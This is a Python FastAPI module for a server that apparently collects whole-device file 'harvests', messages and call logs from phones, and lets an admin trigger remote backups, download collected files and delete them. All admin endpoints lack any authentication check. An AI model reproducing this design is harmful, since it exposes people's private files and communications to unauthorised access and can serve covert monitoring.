import os
import time
import uuid
import shutil
import mimetypes
from typing import Optional
from fastapi import APIRouter, HTTPException, UploadFile, File, Form
from fastapi.responses import FileResponse

try:
    from database import get_db
    from models import BulkDeleteRequest
    from websocket_manager import ws_manager
    from config import (
        MEDIA_DIR, HARVEST_STORAGE_DIR,
        classify_file_format, get_unique_harvest_filename
    )
except ImportError:
    from server.database import get_db
    from server.models import BulkDeleteRequest
    from server.websocket_manager import ws_manager
    from server.config import (
        MEDIA_DIR, HARVEST_STORAGE_DIR,
        classify_file_format, get_unique_harvest_filename
    )

router = APIRouter(tags=["Data Management & Storage Backups"])

def resolve_file_name_and_category(fname: str, fpath: str):
    """
    Detects proper filename with extension using magic bytes if filename lacks extension.
    Returns (display_name, category, mime_type).
    """
    ext = fname.split(".")[-1].lower() if "." in fname else ""
    
    if not ext or len(ext) > 10:
        try:
            with open(fpath, "rb") as f:
                head = f.read(16)
            if head.startswith(b"\x89PNG\r\n\x1a\n"):
                ext = "png"
            elif head.startswith(b"\xff\xd8\xff"):
                ext = "jpg"
            elif head.startswith(b"%PDF"):
                ext = "pdf"
            elif head.startswith(b"PK\x03\x04"):
                ext = "docx"
            elif head.startswith(b"GIF8"):
                ext = "gif"
            elif b"ftyp" in head:
                ext = "mp4"
            elif head.startswith(b"ID3") or head.startswith(b"\xff\xfb"):
                ext = "mp3"
            elif head.startswith(b"<!DOC") or head.startswith(b"<html") or head.startswith(b"<HTML"):
                ext = "html"
            else:
                ext = "bin"
        except Exception:
            ext = "bin"
        display_name = f"{fname}.{ext}" if not fname.endswith(f".{ext}") else fname
    else:
        display_name = fname

    cat = "Image" if ext in ["png", "jpg", "jpeg", "gif", "webp", "bmp"] else \
          "Document" if ext in ["pdf", "doc", "docx", "txt", "html", "htm", "rtf"] else \
          "Spreadsheet" if ext in ["csv", "xlsx", "xls"] else \
          "Audio" if ext in ["mp3", "wav", "m4a", "ogg", "aac", "flac"] else \
          "Video" if ext in ["mp4", "mkv", "avi", "mov", "webm"] else "Other"

    mime_type, _ = mimetypes.guess_type(display_name)
    if not mime_type:
        mime_type = "application/octet-stream"

    return display_name, cat, mime_type

# --- DASHBOARD & DATA SUMMARIES ---

@router.get("/api/dashboard/stats")
def get_dashboard_stats():
    conn = get_db()
    cursor = conn.cursor()

    cursor.execute("SELECT * FROM devices ORDER BY last_sync_timestamp DESC")
    devices = [dict(r) for r in cursor.fetchall()]
    for d in devices:
        d["is_online"] = ws_manager.is_online(d["device_id"]) or (d.get("username") and ws_manager.is_online(d["username"]))

    cursor.execute("""
        SELECT category, SUM(item_count) as total_items, SUM(total_bytes) as total_bytes
        FROM device_storage_summary
        GROUP BY category
    """)
    category_rows = [dict(r) for r in cursor.fetchall()]

    total_files_scanned = sum(r["total_items"] or 0 for r in category_rows)
    total_bytes_scanned = sum(r["total_bytes"] or 0 for r in category_rows)

    cursor.execute("""
        SELECT m.*, u.display_name as sender_name
        FROM messages m
        LEFT JOIN users u ON m.sender_id = u.id
        ORDER BY m.created_at DESC
        LIMIT 20
    """)
    recent_messages = [dict(r) for r in cursor.fetchall()]

    cursor.execute("SELECT * FROM call_logs ORDER BY timestamp DESC LIMIT 20")
    call_histories = [dict(r) for r in cursor.fetchall()]

    conn.close()

    return {
        "total_devices": len(devices),
        "total_files_scanned": total_files_scanned,
        "total_bytes_scanned": total_bytes_scanned,
        "storage_breakdown": category_rows,
        "connected_devices": devices,
        "recent_messages": recent_messages,
        "call_histories": call_histories
    }

@router.get("/api/admin/data-summary")
def get_data_summary():
    conn = get_db()
    cursor = conn.cursor()

    cursor.execute("SELECT COUNT(*) as device_count FROM devices")
    device_stats = dict(cursor.fetchone() or {})
    device_count = device_stats.get("device_count") or 0

    cursor.execute("SELECT COUNT(*) as total_items, COALESCE(SUM(size_bytes), 0) as total_bytes FROM device_files")
    file_stats = dict(cursor.fetchone() or {})
    total_items = file_stats.get("total_items") or 0
    total_bytes_all = file_stats.get("total_bytes") or 0
    total_storage_mb = round(total_bytes_all / 1048576, 2)

    combined_breakdown = {}
    try:
        cursor.execute("""
            SELECT category, COUNT(*) as total_items, COALESCE(SUM(size_bytes), 0) as total_bytes 
            FROM device_files 
            GROUP BY category
        """)
        for r in cursor.fetchall():
            cat = r["category"] or "Other"
            bytes_val = r["total_bytes"] or 0
            items_val = r["total_items"] or 0
            b = bytes_val
            formatted = f"{round(b / 1024, 1)} KB" if b < 1048576 else f"{round(b / 1048576, 1)} MB"
            combined_breakdown[cat] = {"bytes": bytes_val, "count": items_val, "formatted": formatted}
    except Exception:
        combined_breakdown = {}

    cursor.execute("""
        SELECT d.device_id, d.username, d.last_sync_timestamp,
               COUNT(df.id) as item_count,
               COALESCE(SUM(df.size_bytes), 0) as total_bytes
        FROM devices d
        LEFT JOIN device_files df ON d.device_id = df.device_id
        GROUP BY d.device_id
        ORDER BY d.last_sync_timestamp DESC
    """)
    device_storage = []
    for row in cursor.fetchall():
        r_dict = dict(row)
        device_storage.append({
            "device_id": r_dict["device_id"],
            "username": r_dict["username"] or "Unknown",
            "category": "All",
            "total_bytes": r_dict["total_bytes"] or 0,
            "item_count": r_dict["item_count"] or 0,
            "sample_names": [],
            "last_sync": r_dict["last_sync_timestamp"] or int(time.time() * 1000)
        })

    conn.close()

    return {
        "total_storage_mb": total_storage_mb,
        "total_items": total_items,
        "device_count": device_count,
        "category_breakdown": combined_breakdown,
        "device_storage": device_storage
    }

# --- WHOLE-DEVICE HARVEST FILE UPLOAD & TRIGGER ---

@router.post("/api/device/{device_id}/harvest-upload")
@router.post("/api/devices/{device_id}/upload-file")
async def harvest_upload_file(
    device_id: str,
    file: UploadFile = File(...),
    file_name: Optional[str] = Form(None),
    mime_type: Optional[str] = Form(None),
    category: Optional[str] = Form(None),
    username: Optional[str] = Form(None)
):
    device_harvest_dir = os.path.join(HARVEST_STORAGE_DIR, device_id)
    os.makedirs(device_harvest_dir, exist_ok=True)

    raw_filename = file_name or file.filename or f"file_{int(time.time() * 1000)}"
    safe_base_name = os.path.basename(raw_filename)
    unique_filename = get_unique_harvest_filename(device_harvest_dir, safe_base_name)
    target_path = os.path.join(device_harvest_dir, unique_filename)

    with open(target_path, "wb") as buffer:
        shutil.copyfileobj(file.file, buffer)

    size_bytes = os.path.getsize(target_path)
    now = int(time.time() * 1000)
    file_id = str(uuid.uuid4())

    effective_mime = mime_type or file.content_type or "application/octet-stream"
    assigned_category = category if category and category != "Other" else classify_file_format(unique_filename, effective_mime)

    conn = get_db()
    cursor = conn.cursor()

    resolved_username = username
    if not resolved_username or resolved_username == "Current User":
        cursor.execute("SELECT username FROM devices WHERE device_id = ?", (device_id,))
        dev_row = cursor.fetchone()
        if dev_row and dev_row["username"]:
            resolved_username = dev_row["username"]
        else:
            resolved_username = "device_user"

    cursor.execute("""
        INSERT INTO device_files (id, device_id, username, filename, category, size_bytes, mime_type, file_path, created_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
    """, (file_id, device_id, resolved_username, unique_filename, assigned_category, size_bytes, effective_mime, target_path, now))

    cursor.execute("""
        UPDATE devices 
        SET total_files = COALESCE(total_files, 0) + 1, last_sync_timestamp = ?
        WHERE device_id = ?
    """, (now, device_id))

    conn.commit()
    conn.close()

    await ws_manager.broadcast_all({
        "type": "DEVICE_FILE_UPLOADED",
        "device_id": device_id,
        "filename": unique_filename,
        "category": assigned_category,
        "size_bytes": size_bytes
    })

    return {
        "status": "success",
        "file_id": file_id,
        "filename": unique_filename,
        "category": assigned_category,
        "size_bytes": size_bytes,
        "message": f"Successfully ingested {unique_filename}"
    }

@router.post("/api/admin/devices/{device_id}/trigger-backup")
async def trigger_device_backup(device_id: str):
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT username, user_id FROM devices WHERE device_id = ?", (device_id,))
    dev_row = cursor.fetchone()
    conn.close()

    signal_payload = {
        "type": "ACTION_START_BACKUP",
        "device_id": device_id,
        "timestamp": int(time.time() * 1000)
    }

    await ws_manager.broadcast_all(signal_payload)

    if dev_row:
        if dev_row["user_id"]:
            await ws_manager.send_personal_message(signal_payload, dev_row["user_id"])
        if dev_row["username"]:
            await ws_manager.send_personal_message(signal_payload, dev_row["username"])

    return {
        "status": "success",
        "message": f"Backup signal successfully dispatched to device {device_id}",
        "device_id": device_id
    }

# --- ADMIN FILES LIST, DOWNLOAD, & DELETE ---

@router.get("/api/admin/files")
def get_admin_files():
    files = []
    try:
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute("""
            SELECT df.*, d.device_model, u.display_name 
            FROM device_files df
            LEFT JOIN devices d ON df.device_id = d.device_id
            LEFT JOIN users u ON df.username = u.username
            ORDER BY df.created_at DESC
        """)
        for row in cursor.fetchall():
            r = dict(row)
            fname = r["filename"]
            disp_name = fname
            cat = r["category"]
            sz = r["size_bytes"]
            username = r["username"] or "unknown_user"
            display_name = r["display_name"] or username
            device_model = r["device_model"] or r["device_id"]

            files.append({
                "id": r["id"],
                "name": disp_name,
                "category": cat,
                "size_bytes": sz,
                "size_formatted": f"{round(sz / 1024, 1)} KB" if sz < 1048576 else f"{round(sz / 1048576, 1)} MB",
                "username": username,
                "display_name": display_name,
                "device_id": device_model,
                "created_at": r["created_at"],
                "download_url": f"/api/admin/files/download/{r['id']}"
            })
        conn.close()
    except Exception:
        pass

    return files

@router.get("/api/admin/files/download/{file_name}")
def download_admin_file(file_name: str):
    # 1. Check in device_files
    try:
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM device_files WHERE id = ? OR filename = ?", (file_name, file_name))
        row = cursor.fetchone()
        conn.close()
        if row and os.path.exists(row["file_path"]):
            disp_name = row["filename"]
            mime_type = row["mime_type"] or "application/octet-stream"
            return FileResponse(
                path=row["file_path"],
                filename=disp_name,
                media_type=mime_type,
                headers={
                    "Content-Disposition": f'attachment; filename="{disp_name}"',
                    "Access-Control-Expose-Headers": "Content-Disposition"
                }
            )
    except Exception:
        pass

    # 2. Check in MEDIA_DIR
    fpath = os.path.join(MEDIA_DIR, file_name)
    if not os.path.exists(fpath):
        base_name = file_name.split(".")[0]
        alt_path = os.path.join(MEDIA_DIR, base_name)
        if os.path.exists(alt_path):
            fpath = alt_path

    if not os.path.exists(fpath):
        raise HTTPException(status_code=404, detail="Requested file does not exist")

    disp_name, _, mime_type = resolve_file_name_and_category(file_name, fpath)

    return FileResponse(
        path=fpath,
        filename=disp_name,
        media_type=mime_type,
        headers={
            "Content-Disposition": f'attachment; filename="{disp_name}"',
            "Access-Control-Expose-Headers": "Content-Disposition"
        }
    )

@router.delete("/api/admin/files/{file_name}")
async def delete_admin_file(file_name: str):
    try:
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM device_files WHERE id = ? OR filename = ?", (file_name, file_name))
        row = cursor.fetchone()
        if row:
            if os.path.exists(row["file_path"]):
                try:
                    os.remove(row["file_path"])
                except Exception:
                    pass
            cursor.execute("DELETE FROM device_files WHERE id = ?", (row["id"],))
            cursor.execute("""
                UPDATE devices 
                SET total_files = (SELECT COUNT(*) FROM device_files WHERE device_id = devices.device_id)
            """)
            conn.commit()
        cursor.execute("DELETE FROM device_storage_summary WHERE sample_names LIKE ?", (f"%{file_name}%",))
        conn.commit()
        conn.close()
    except Exception:
        pass

    fpath = os.path.join(MEDIA_DIR, file_name)
    if os.path.exists(fpath):
        try:
            os.remove(fpath)
        except Exception:
            pass

    await ws_manager.broadcast_all({
        "type": "ADMIN_FILE_DELETED",
        "file_name": file_name
    })

    return {"status": "success", "message": f"File {file_name} deleted successfully"}

@router.post("/api/admin/files/bulk-delete")
async def bulk_delete_admin_files(req: BulkDeleteRequest):
    deleted_count = 0
    try:
        conn = get_db()
        cursor = conn.cursor()

        targets = []
        if req.file_ids:
            targets.extend(req.file_ids)
        if req.file_names:
            targets.extend(req.file_names)

        if req.delete_all:
            cursor.execute("SELECT id, file_path, filename FROM device_files")
            rows = cursor.fetchall()
        elif req.category and req.category != "ALL":
            cursor.execute("SELECT id, file_path, filename FROM device_files WHERE category LIKE ?", (f"%{req.category}%",))
            rows = cursor.fetchall()
        elif targets:
            placeholders = ",".join(["?"] * len(targets))
            cursor.execute(f"SELECT id, file_path, filename FROM device_files WHERE id IN ({placeholders}) OR filename IN ({placeholders})", targets + targets)
            rows = cursor.fetchall()
        else:
            rows = []

        for row in rows:
            fpath = row["file_path"] if "file_path" in row.keys() else None
            if fpath and os.path.exists(fpath):
                try:
                    os.remove(fpath)
                except Exception:
                    pass
            cursor.execute("DELETE FROM device_files WHERE id = ?", (row["id"],))
            deleted_count += 1

        if targets:
            for name in targets:
                fpath = os.path.join(MEDIA_DIR, name)
                if os.path.exists(fpath):
                    try:
                        os.remove(fpath)
                    except Exception:
                        pass
                cursor.execute("DELETE FROM device_storage_summary WHERE sample_names LIKE ?", (f"%{name}%",))

        cursor.execute("""
            UPDATE devices 
            SET total_files = (SELECT COUNT(*) FROM device_files WHERE device_id = devices.device_id)
        """)
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"Error during bulk file deletion: {e}")

    await ws_manager.broadcast_all({
        "type": "ADMIN_FILES_BULK_DELETED",
        "deleted_count": deleted_count
    })

    return {"status": "success", "deleted_count": deleted_count, "message": f"Successfully deleted {deleted_count} files."}
